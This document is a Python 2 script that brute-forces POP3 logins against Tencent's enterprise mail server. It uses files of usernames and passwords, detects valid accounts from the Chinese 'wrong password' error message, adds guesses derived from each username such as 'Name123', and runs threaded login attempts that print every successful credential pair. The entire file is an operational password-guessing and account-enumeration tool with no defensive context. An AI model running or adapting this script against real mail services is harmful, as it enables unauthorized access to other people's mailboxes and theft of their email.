#coding:utf-8
import poplib
import os
import threading

queuenum = 1
host = "pop.exmail.qq.com"
username = []
password = []

class mail(threading.Thread):
	def __init__(self,user,passwd,queue):
        	threading.Thread.__init__(self)
        	self.user = user
        	self.passwd = passwd
        	self.queue = queue

    	def run(self):
        	with self.queue:
            		try:
                		pop = poplib.POP3_SSL(host,995)
                		print "try:"+self.user+"/"+self.passwd+" ..."
                		welcome = pop.getwelcome()
                		pop.user(self.user)
                		auth = pop.pass_(self.passwd)
                		if auth == "+OK":
                    			pop.quit()
                    			print "success:"+self.user+"/"+self.passwd
                		else:
                    			pop.quit()
            		except Exception,e:
                		print e

if __name__ == '__main__':
    	threadingSum = threading.Semaphore(queuenum)
	f = open("./mailuser.txt",'r')
	for m in f:
		mu = m.strip('\n')
		#mu = mu.split('@')[0]
		username.append(mu)
	f.close()
	g = open("./password.txt",'r')
	for mm in g:
		pa = mm.strip('\n')
		password.append(pa)
	g.close()
        for u in username:
            	try:
                	pop = poplib.POP3_SSL(host,995)
                	pop.user(u)
                	auth = pop.pass_(u)
            	except Exception,e:
                	e=str(e).decode('gbk')
                	if e.count(u'密码错误或者')>0:
				u = u.split('@')[0]
                    		password.append(u.capitalize()+"123")
				password.append(u.capitalize()+"123456")
                    		for p in password:
					t = mail(u,p,threadingSum)
					t.start()
			else:
				print e
		for t in threading.enumerate():
			if t is threading.currentThread():
				continue
			t.join()


